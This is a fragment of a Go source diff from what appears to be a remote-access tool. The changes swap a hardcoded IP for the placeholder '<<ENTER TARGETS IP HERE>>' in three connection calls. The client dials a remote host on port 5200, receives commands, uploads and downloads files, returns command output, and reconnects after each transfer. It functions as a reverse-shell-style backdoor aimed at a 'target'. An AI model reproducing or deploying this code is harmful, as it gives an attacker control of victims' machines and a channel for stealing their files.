@@ -13,7 +13,7 @@ import (
 func main() {
 	fmt.Println("Initiate connection with remote host")
 	command := ""
-	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+	conn, err := net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second)) //see bellow in the code there two more net.Dial Funcions for the re establish change i[p there too (sorry for the hard code :) )
 
 	if err != nil {
 		fmt.Println("Nope exiting", conn)
@@ -43,13 +43,13 @@ for{
 		upload_file(_command[9:], conn)
 		conn.Close()
 		time.Sleep(1*time.Second)
-		conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+		conn, _ = net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second))
 	}else if (len(_command)>=6 && _command[:6] =="upload"){
 		download_file(_command[7:], conn)
 
 		conn.Close()
 		time.Sleep(1*time.Second)
-		conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+		conn, _ = net.DialTimeout("tcp", "<<ENTER TARGETS IP HERE>>:5200", time.Duration(1*time.Second))
 
 	}
 		send_data(conn, basic_commants(_command))	
